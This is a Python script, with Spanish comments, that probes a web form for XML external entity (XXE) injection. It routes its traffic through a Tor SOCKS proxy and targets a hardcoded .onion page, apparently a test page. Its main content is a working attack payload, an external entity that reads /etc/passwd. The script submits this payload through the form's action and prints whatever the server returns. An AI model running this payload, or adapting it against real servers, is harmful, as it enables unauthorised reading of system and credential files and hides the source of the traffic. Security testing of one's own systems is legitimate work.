import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class XXEScanner:
    def __init__(self, proxy_address="127.0.0.1", proxy_port=9050):
        self.session = requests.Session()
        self.proxies = {
            'http': f'socks5h://{proxy_address}:{proxy_port}',
            'https': f'socks5h://{proxy_address}:{proxy_port}'
        }

    def scan_for_xxe_vulnerability(self, url):
        try:
            print(f"Escanenado la página {url} en busca de vulnerabilidades XXE...")
            response = self.session.get(url, proxies=self.proxies, allow_redirects=True)
            response.raise_for_status()
            html_content = response.text
            soup = BeautifulSoup(html_content, 'html.parser')

            # Verificar si existe un formulario en la página
            form = soup.find('form')
            if form is None:
                print(f"No se encontró ningún formulario en {url}")
                return

            # Obtener el atributo 'action' del formulario, si está presente
            form_action = form.get('action')
            if form_action is None:
                print(f"No se encontró el atributo 'action' en el formulario de {url}")
                return

            # Obtener el atributo 'method' del formulario, si está presente
            form_method = form.get('method', '').lower()

            # Payload XML con una entidad externa
            payload = """<?xml version="1.0"?>
            <!DOCTYPE test [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <test>&xxe;</test>"""

            # Enviar solicitud POST con el payload XML al archivo PHP y recibir respuesta
            if form_method == 'post':
                res = self.session.post(urljoin(url, form_action), data={'xml_data': payload}, proxies=self.proxies, allow_redirects=True)
            elif form_method == 'get':
                res = self.session.get(urljoin(url, form_action), params={'xml_data': payload}, proxies=self.proxies, allow_redirects=True)
            print(f"Respuesta del servidor PHP: {res.text}")
            # Verificar si la respuesta contiene el contenido de /etc/passwd
            if 'root:' in res.text:
                print(f"La página {url} es vulnerable a XXE.")
            else:
                print(f"La página {url} no es vulnerable a XXE.")
        except Exception as e:
            print(f"Error al escanear la página {url}: {str(e)}")

if __name__ == "__main__":
    # URL de la página que deseas escanear
    target_url = "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_xmli/prueba_xmli.html"

    # Crear una instancia del escáner XXE con el proxy especificado
    xxe_scanner = XXEScanner()

    # Escanear la página en busca de vulnerabilidades XXE
    xxe_scanner.scan_for_xxe_vulnerability(target_url)
